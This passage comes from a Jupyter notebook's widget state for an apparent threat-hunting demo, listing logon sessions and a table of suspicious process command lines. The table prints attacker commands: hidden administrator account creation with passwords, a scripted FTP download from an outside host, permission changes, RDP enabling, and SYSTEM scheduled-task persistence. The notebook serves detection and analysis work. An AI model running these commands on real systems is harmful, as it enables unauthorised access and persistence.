        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:07.463000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:07.473000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:07.540000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:11.357000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:11.530000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:11.533000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:11.563000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:11.567000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:11.573000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:11.620000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:11.623000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:11.867000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:40:52.343000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:43:56.327000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:44:10.343000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:44:35.143000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:50:09.713000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:50:18.660000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 04:56:34.307000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 06:42:08.110000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 20:09:16.550000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 20:11:06.790000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 20:12:07.010000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 20:12:46.627000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 20:19:52.520000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 20:30:34.990000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 20:30:55.050000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 20:39:14.110000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 20:39:45.067000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 21:05:29.523000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 21:20:35.003000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 21:39:15.897000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 21:43:25.113000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 21:43:25.113000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 21:43:25.143000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 21:43:25.143000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 21:43:40.237000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 21:49:11.777000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 21:53:36.280000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 21:53:53.453000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 21:58:50.533000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 21:58:50.563000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 22:07:40.680000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 22:07:40.703000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 22:13:04.753000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 22:13:07.250000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 22:13:39.547000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 22:14:07.417000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-12 22:20:59.200000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-13 00:57:06.550000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-13 03:15:18.813000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-13 04:44:32.913000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-13 20:08:39.067000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-13 20:08:47.880000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-13 20:09:41.273000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-13 20:11:41.150000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-13 21:10:58.540000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-13 21:35:26.413000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-13 22:08:46.537000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 03:00:42.233000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 03:00:44.240000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 03:00:52.483000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 03:34:08.193000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 03:38:46.517000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:12:44.970000)    logonid=0x3e7",
        "SYSTEM:    (logontype=0)   (timestamp=2019-02-14 04:20:54.370000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:54.530000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:54.600000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:54.603000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:54.760000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:54.987000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:55.040000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:55.503000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:55.623000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:55.623000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:55.653000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:55.663000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:55.677000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:55.687000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:55.700000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:20:55.763000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:21:27.023000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:21:37.637000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:21:42.327000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:21:45.410000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:21:53.193000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:24:28.893000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:25:11.653000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:25:59.013000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:31:12.283000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 04:51:37.183000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-14 14:51:37.637000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-15 01:21:37.540000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-15 02:56:44.070000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-15 03:57:03.627000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-15 03:57:03.680000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-15 04:15:12.223000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-15 04:16:08.337000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-15 04:21:37.163000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-15 06:51:51.500000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-15 08:23:01.823000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-15 08:51:51.763000)    logonid=0x3e7",
        "SYSTEM:    (logontype=5)   (timestamp=2019-02-15 11:51:37.597000)    logonid=0x3e7"
       ],
       "description": "Select logon instance to examine",
       "index": 0,
       "layout": "IPY_MODEL_faf8048b3b904576bcb815288a03c562",
       "style": "IPY_MODEL_f7a711dc6afe4c4f8c39334a586acc7c"
      }
     },
     "409d35d2dcf24960a239711a8bd27f0f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "200px",
       "width": "40%"
      }
     },
     "40fefc7d4b4f4cefa9aa4cb58bdd7f99": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "Add ⇾",
       "layout": "IPY_MODEL_a559dc7951274d73a93155fedf0a59d2",
       "style": "IPY_MODEL_8bd81de6407f4c84b39f9844a8da998b"
      }
     },
     "41e85842aafc4de0a108a83792c0bc9a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SelectMultipleModel",
      "state": {
       "_options_labels": [
        "AKAMAI-AS - Akamai Technologies, Inc., US",
        "AKAMAI-ASN1, US",
        "AMAZON-02 - Amazon.com, Inc., US",
        "BYTEMARK-AS, GB",
        "CENTURYLINK-US-LEGACY-QWEST - CenturyLink Communications, LLC, US",
        "EDGECAST - MCI Communications Services, Inc. d/b/a Verizon Business, US",
        "GOOGLE - Google LLC, US",
        "HIGHWINDS3 - Highwinds Network Group, Inc., US",
        "JUMP, GB",
        "LEVEL3 - Level 3 Parent, LLC, US",
        "MICROSOFT-CORP-AS - Microsoft Corporation, US",
        "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation, US",
        "TELE2, SE"
       ],
       "description": "Source: ",
       "index": [],
       "layout": "IPY_MODEL_fc3db55f546c40afa64d67b7360a6d02",
       "rows": 5,
       "style": "IPY_MODEL_bfb8a488cfc44d1ca3b4b1bf822174a0"
      }
     },
     "42d783a722e9479f9439d2f612082ad8": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "42e3cac0008e4bc7956c5f8e019e90a5": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_41e85842aafc4de0a108a83792c0bc9a",
        "IPY_MODEL_959586dcc3954050830a8e87bd534f7d",
        "IPY_MODEL_dd2479761ed24cc69dabb38053f99511"
       ],
       "layout": "IPY_MODEL_586a2dc973494ea1aa0d85299d226965"
      }
     },
     "43b3016d401048c890fed15c30347c6f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "43e8273a9cc34ac69bb025dbeaf25793": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SliderStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "442fb6c47ff346c8afb53bdbe9f44b83": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_5fdbbe59702149c29ba4aef74b95f10a",
        "IPY_MODEL_f91d041e50034251988aeddb99ce9016",
        "IPY_MODEL_ec7550e3f51f4256bc1ceff5661d9ebb"
       ],
       "layout": "IPY_MODEL_493e93f681fa488fabd0d691ee2a653e"
      }
     },
     "44676d6ac96d40d5873a57c074df2cd4": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "446cfff5dd724221a3e5761d82a26a92": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "449a40de45fc41b3ac3615ffae8376f6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Time (24hr)",
       "layout": "IPY_MODEL_7162a226093945808a401b8746fee2e7",
       "style": "IPY_MODEL_8b0d9225cb1c435799c8826a09fdcb56",
       "value": "12:32:50.220000"
      }
     },
     "45880404b3144f1790fa82567f2767f0": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "CheckboxModel",
      "state": {
       "description": "View All Processes (Clustered only if not checked)",
       "disabled": false,
       "layout": "IPY_MODEL_faf8048b3b904576bcb815288a03c562",
       "style": "IPY_MODEL_4f038535938f407dbbe8d4861a211ba5",
       "value": false
      }
     },
     "493e93f681fa488fabd0d691ee2a653e": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "4accbb3de0464027af1704a318488c24": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "4bdf6470d75d4ffcbc30ac623a74f203": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "4be552417ab64dcc9bf5918a78b69330": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_name": "IntRangeSliderModel",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (day):",
       "layout": "IPY_MODEL_7bad741963b1454eb19d30ac81f86307",
       "max": 28,
       "min": -28,
       "style": "IPY_MODEL_43e8273a9cc34ac69bb025dbeaf25793",
       "value": [
        -2,
        5
       ]
      }
     },
     "4c014001e1724a2ebf2f00ce17ea3f8f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "4d534e9db5b1465fb66bd32932549174": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "4e68cdaca5614fe4b17ba36ad51e69b4": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "4eef56d2f8c94176af3da2610d0c5c3c": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "4f038535938f407dbbe8d4861a211ba5": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "4fb6c7923bb64be5aebfbf69278dc2de": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_953977c100b34b77959a4e5c3b9c0038",
        "IPY_MODEL_8d5cd20bd4904e08b329de7fa61d317c",
        "IPY_MODEL_8f00f66355dc450189a6cb877f7e9c13"
       ],
       "layout": "IPY_MODEL_62aa1ffa74ba4878bb25915f435e281e"
      }
     },
     "52b9de20ae1e49bebbf5a1c3bd6a36c9": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_79a6985af45140dc8cdcd6c43dd68370",
        "IPY_MODEL_722d6ef1266046ad93ceede2978fdbf8",
        "IPY_MODEL_7a159bb041724c4fbd4e965a018e7198",
        "IPY_MODEL_87f58248b8e3471289e050ccc3e4446f"
       ],
       "layout": "IPY_MODEL_b289892730c149249abba2c415b26d96"
      }
     },
     "55b212b9043f4431be4d7aa1fe162740": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SliderStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "57701cdda7d74a9582df445479713a9a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "57766e5d8e314d1188554b3fb1d0c1df": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_63edb5f031f84d89830b6d2a2fb2ec93",
        "IPY_MODEL_c00acfe125f743ab8210567f9140a26f",
        "IPY_MODEL_5fdfda0a8882455e945ca322029be6fe"
       ],
       "layout": "IPY_MODEL_79967f1b183646a69edc2acbf06bf8e7"
      }
     },
     "586a2dc973494ea1aa0d85299d226965": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "59ad4ea51bb54c328e7a791384ca127e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "_dom_classes": [
        "widget-interact"
       ],
       "children": [
        "IPY_MODEL_3f9f777b6c9a4f2d977c8c2667c38ef2",
        "IPY_MODEL_cb950670b77c4bccbe5d0959b8d9a705"
       ],
       "layout": "IPY_MODEL_8f609132c4734e0f8c445ffb5e70568e"
      }
     },
     "5a284195008247eea8ba6cc1d09f5810": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_d3f174e10e2d482a96ec9386c94a8126",
        "IPY_MODEL_42e3cac0008e4bc7956c5f8e019e90a5"
       ],
       "layout": "IPY_MODEL_e52fc813d2f74c47b30b7aebca981895"
      }
     },
     "5b6148668ec245d1b38a6027f08b65ae": {
      "model_module": "@jupyter-widgets/output",
      "model_module_version": "1.0.0",
      "model_name": "OutputModel",
      "state": {
       "layout": "IPY_MODEL_b275c0ae8f874aeb9bf37f2c00d275e7",
       "outputs": [
        {
         "data": {
          "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>NewProcessName</th>\n      <th>CommandLine</th>\n      <th>SubjectLogonId</th>\n      <th>ClusterSize</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>14683</th>\n      <td>C:\\Windows\\System32\\conhost.exe</td>\n      <td>\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1</td>\n      <td>0xbd57571</td>\n      <td>17</td>\n    </tr>\n    <tr>\n      <th>20175</th>\n      <td>C:\\Windows\\System32\\cmd.exe</td>\n      <td>cmd  /c echo Begin Security Demo tasks</td>\n      <td>0xbd57571</td>\n      <td>18</td>\n    </tr>\n    <tr>\n      <th>20176</th>\n      <td>C:\\Windows\\System32\\cmd.exe</td>\n      <td>cmd  /c echo End Security Demo tasks</td>\n      <td>0xbd57571</td>\n      <td>18</td>\n    </tr>\n    <tr>\n      <th>20189</th>\n      <td>C:\\Windows\\System32\\cmd.exe</td>\n      <td>cmd  /c echo Any questions about the commands executed here then please contact one of</td>\n      <td>0xbd57571</td>\n      <td>8</td>\n    </tr>\n    <tr>\n      <th>20197</th>\n      <td>C:\\Windows\\System32\\cmd.exe</td>\n      <td>cmd  /c echo timb@microsoft.com; ianhelle@microsoft.com; shainw@microsoft.com</td>\n      <td>0xbd57571</td>\n      <td>8</td>\n    </tr>\n    <tr>\n      <th>20692</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  users</td>\n      <td>0xbd57571</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>20696</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  users</td>\n      <td>0xbd57571</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>20714</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  user abai$ Wf9k44_9d[=$ /add</td>\n      <td>0xbd57571</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>20715</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  user www.401hk.com /active:yes</td>\n      <td>0xbd57571</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>20718</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  user abai$ Wf9k44_9d[=$ /add</td>\n      <td>0xbd57571</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>20719</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  user www.401hk.com /active:yes</td>\n      <td>0xbd57571</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>20724</th>\n      <td>C:\\Windows\\System32\\cmd.exe</td>\n      <td>cmd  /c echo open ftp.wh401k.org</td>\n      <td>0xbd57571</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>20725</th>\n      <td>C:\\Windows\\System32\\ftp.exe</td>\n      <td>ftp  -s:MG06.dll</td>\n      <td>0xbd57571</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>20726</th>\n      <td>C:\\W!ndows\\System32\\cacls.exe</td>\n      <td>cacls.exe  C:\\Windows\\system32\\cscript.exe /e /t /g SYSTEM:F</td>\n      <td>0xbd57571</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>20727</th>\n      <td>C:\\Windows\\System32\\findstr.exe</td>\n      <td>findstr  \"abai$\"</td>\n      <td>0xbd57571</td>\n      <td>2</td>\n    </tr>\n    <tr>\n      <th>20729</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  user abai$ Wf9k44_9d[=$</td>\n      <td>0xbd57571</td>\n      <td>2</td>\n    </tr>\n    <tr>\n      <th>20730</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  user abai$ /delete</td>\n      <td>0xbd57571</td>\n      <td>2</td>\n    </tr>\n    <tr>\n      <th>20731</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  user abai$ Wf9k44_9d[=$</td>\n      <td>0xbd57571</td>\n      <td>2</td>\n    </tr>\n    <tr>\n      <th>20732</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  user abai$ /delete</td>\n      <td>0xbd57571</td>\n      <td>2</td>\n    </tr>\n    <tr>\n      <th>20733</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  localgroup administrators</td>\n      <td>0xbd57571</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>20734</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  localgroup administrators</td>\n      <td>0xbd57571</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>20735</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  localgroup administrators abai$ /add</td>\n      <td>0xbd57571</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>20736</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  user www.401hk.com Wf9k44_sinc9d3[=$</td>\n      <td>0xbd57571</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>20737</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  localgroup administrators abai$ /delete</td>\n      <td>0xbd57571</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>20738</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  user www.401hk.com /delete</td>\n      <td>0xbd57571</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>20739</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  localgroup administrators abai$ /add</td>\n      <td>0xbd57571</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>20740</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  user www.401hk.com Wf9k44_sinc9d3[=$</td>\n      <td>0xbd57571</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>20741</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  localgroup administrators abai$ /delete</td>\n      <td>0xbd57571</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>20742</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  user www.401hk.com /delete</td>\n      <td>0xbd57571</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>20743</th>\n      <td>C:\\Windows\\System32\\findstr.exe</td>\n      <td>findstr  \"www.401hk.com\"</td>\n      <td>0xbd57571</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>20744</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  user www.401hk.com Wf9k44_9d[=$ /add</td>\n      <td>0xbd57571</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>20745</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  user www.401hk.com Wf9k44_9d[=$ /add</td>\n      <td>0xbd57571</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>20746</th>\n      <td>C:\\W!ndows\\System32\\reg.exe</td>\n      <td>reg  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DW...</td>\n      <td>0xbd57571</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>20747</th>\n      <td>C:\\Windows\\System32\\schtasks.exe</td>\n      <td>schtasks.exe  /create /tn  /tr \"c:\\pagefile.exe /?\" /sc hour /mo 1 /ru \"system\" /f</td>\n      <td>0xbd57571</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>20748</th>\n      <td>C:\\Windows\\System32\\PING.EXE</td>\n      <td>ping  127.0.0.1 -n 100</td>\n      <td>0xbd57571</td>\n      <td>1</td>\n    </tr>\n  </tbody>\n</table>\n</div>",
          "text/plain": "                         NewProcessName  \\\n14683   C:\\Windows\\System32\\conhost.exe   \n20175       C:\\Windows\\System32\\cmd.exe   \n20176       C:\\Windows\\System32\\cmd.exe   \n20189       C:\\Windows\\System32\\cmd.exe   \n20197       C:\\Windows\\System32\\cmd.exe   \n20692       C:\\Windows\\System32\\net.exe   \n20696      C:\\Windows\\System32\\net1.exe   \n20714       C:\\Windows\\System32\\net.exe   \n20715       C:\\Windows\\System32\\net.exe   \n20718      C:\\Windows\\System32\\net1.exe   \n20719      C:\\Windows\\System32\\net1.exe   \n20724       C:\\Windows\\System32\\cmd.exe   \n20725       C:\\Windows\\System32\\ftp.exe   \n20726     C:\\W!ndows\\System32\\cacls.exe   \n20727   C:\\Windows\\System32\\findstr.exe   \n20729       C:\\Windows\\System32\\net.exe   \n20730       C:\\Windows\\System32\\net.exe   \n20731      C:\\Windows\\System32\\net1.exe   \n20732      C:\\Windows\\System32\\net1.exe   \n20733       C:\\Windows\\System32\\net.exe   \n20734      C:\\Windows\\System32\\net1.exe   \n20735       C:\\Windows\\System32\\net.exe   \n20736       